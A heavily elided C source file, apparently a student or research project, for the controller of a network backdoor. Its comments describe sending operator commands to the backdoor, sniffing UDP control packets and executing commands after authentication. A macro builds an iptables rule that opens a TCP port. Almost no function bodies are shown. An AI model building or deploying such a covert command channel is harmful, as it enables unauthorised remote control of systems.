 ...
 * REVISIONS:      N/A
 *
 * DESIGNER:       Derek Wong, Bin Zhu
 *
 * PROGRAMMER:     Derek Wong, Bin Zhu
 *
 * NOTES:
 * The program is an entry point to Handler application
 * ----------------------------------------------------------------------------------------------------------------------------*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
...
#define TO_INT(x) #x
#define OPEN_PORT_RULE(port) "iptables -I INPUT -p tcp --dport " TO_INT(port) " -j ACCEPT"
 ...
 * PROGRAMMER:     Derek Wong, Bin Zhu
 *
 * INTERFACE:      void *read_user_cmd(void *vargp)
 *
 * RETURNS:        void
 *
 * NOTES:
 * Reads user input commands to send to the backdoor
 * ------------------------------------------------------------------------------------------------------------------------------*/
void *read_user_cmd(void *vargp)
{
   while (1)
 ...
 * PROGRAMMER:     Derek Wong, Bin Zhu
 *
 * INTERFACE:      void *sniff_ctrl_packet(void *vargp)
 *
 * RETURNS:        void
 *
 * NOTES:
 * UDP packet sniffing function
 * ------------------------------------------------------------------------------------------------------------------------------*/
void *sniff_ctrl_packet(void *vargp)
{
   SNIFFER_INFO info = {
 ...
 * PROGRAMMER:     Derek Wong, Bin Zhu
 *
 * INTERFACE:      packet_handler(char *payload, size_t payload_len)
 *
 * RETURNS:        void
 *
 * NOTES:
 * Primary packet handling functionality to perform command execution once successfully authenticated
 * ------------------------------------------------------------------------------------------------------------------------------*/
void packet_handler(char *payload, size_t payload_len)
{
